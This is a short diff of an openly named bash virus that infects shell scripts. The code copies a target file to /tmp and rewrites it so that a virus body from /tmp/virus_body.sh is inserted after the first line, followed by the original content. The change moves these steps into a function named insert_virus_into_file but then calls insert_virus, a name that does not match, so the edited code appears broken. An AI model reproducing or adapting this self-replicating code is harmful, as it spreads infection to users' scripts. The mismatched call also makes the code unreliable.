@@ -34,13 +34,16 @@ do
 	    continue
 	fi
 	
-	cp $OBJECT /tmp
-	echo $BASH_FILE_FIRST_LINE > $OBJECT
-	cat /tmp/virus_body.sh >> $OBJECT
-	echo '' >> $OBJECT
-	cat /tmp/$OBJECT | tail -n +2 >> $OBJECT
+	insert_virus_into_file() {
+		cp $OBJECT /tmp
+		echo $BASH_FILE_FIRST_LINE > $OBJECT
+		cat /tmp/virus_body.sh >> $OBJECT
+		echo '' >> $OBJECT
+		cat /tmp/$OBJECT | tail -n +2 >> $OBJECT
+		rm /tmp/$OBJECT
+	}
 	
-	rm /tmp/$OBJECT
+	insert_virus
 	
 	# Infecting just one file
 	break
